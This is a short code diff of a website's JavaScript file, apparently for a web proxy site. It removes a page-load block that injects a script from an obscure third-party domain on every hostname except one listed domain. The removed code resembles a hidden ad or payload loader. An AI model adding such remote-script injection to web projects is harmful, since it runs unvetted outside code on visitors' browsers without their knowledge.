@@ -66,15 +66,7 @@ async function updateConnectionStatus() {
 }
 
 document.addEventListener("DOMContentLoaded", () => {
-  // Blocked Hostnames Check
-  const blockedHostnames = ["gointerstellar.app"];
 
-  if (!blockedHostnames.includes(window.location.hostname)) {
-    const script = document.createElement("script");
-    script.type = "text/javascript";
-    script.src = "//nightsclotheshazardous.com/1c/c3/8a/1cc38a6899fdf8ba4dfe779bcc54627b.js";
-    document.body.appendChild(script);
-  }
 
   const nav = document.querySelector(".f-nav");
 
